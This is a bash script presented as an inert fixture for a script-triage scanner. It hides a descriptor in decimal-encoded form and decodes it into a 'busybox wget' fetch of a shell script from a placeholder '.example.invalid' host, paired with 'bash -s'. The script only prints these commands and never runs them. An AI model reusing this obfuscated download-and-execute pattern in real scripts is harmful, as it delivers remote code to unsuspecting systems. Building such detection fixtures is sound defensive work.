#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_ba5a7fa0='118,61,49,124,115,116,101,112,115,61,97,99,113,117,105,114,101,95,114,101,109,111,116,101,44,100,105,115,112,97,116,99,104,95,112,105,112,101,124,97,100,97,112,116,101,114,61,98,117,115,121,98,111,120,95,119,103,101,116,95,115,116,100,111,117,116,124,115,116,97,103,101,95,99,111,117,110,116,61,49,124,99,97,109,112,97,105,103,110,95,105,100,61,99,97,109,112,97,105,103,110,45,55,49,102,50,98,100,102,49,56,56,124,117,114,108,61,104,116,116,112,115,58,47,47,55,49,102,50,98,100,102,49,56,56,46,101,120,97,109,112,108,101,46,105,110,118,97,108,105,100,47,99,99,56,52,53,97,101,100,46,115,104,124,117,115,101,114,95,97,103,101,110,116,61,72,117,110,116,114,101,115,115,76,97,98,47,55,49,102,50,98,100,102,49,56,56'
  readonly Codec_ba5a7fa0='reversed_decimal|reverse_bytes|'

  Load_ba5a7fa0() {
    v_a19c=()
    local IFS=',' v_e598
    local -a pieces
    read -r -a pieces <<< "${Material_ba5a7fa0}"
    for ((v_e598=${#pieces[@]}-1; v_e598>=0; v_e598--)); do v_a19c+=("${pieces[v_e598]}"); done
  }

  Decode_ba5a7fa0() {
    v_b27e=()
    local v_e598
    for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
      v_b27e[${#v_a19c[@]}-1-v_e598]="${v_a19c[v_e598]}"
    done
  }

  Recover_ba5a7fa0() {
    local -a v_a19c v_b27e
    local v_c304 v_d41a v_b803 v_e598
    v_d41a="${HUNTRESS_FIXTURE_CONTEXT:-host}"
    Load_ba5a7fa0
    if ! Decode_ba5a7fa0; then return 71; fi
    v_c304=''
    local octal character
    for v_e598 in "${!v_b27e[@]}"; do
      printf -v octal '%03o' "${v_b27e[v_e598]}"
      printf -v character '%b' "\\$octal"
      v_c304+="$character"
    done
    printf '%s\n' "$v_c304"
  }

  Inspect_ba5a7fa0() { local recovered field; local -a fields; recovered="$(Recover_ba5a7fa0)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

  Plan_ba5a7fa0() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_ba5a7fa0)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(busybox wget -qO- "$url")
    local -a interpreter=(bash -s)
    declare -p request_command interpreter
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_ba5a7fa0; fi
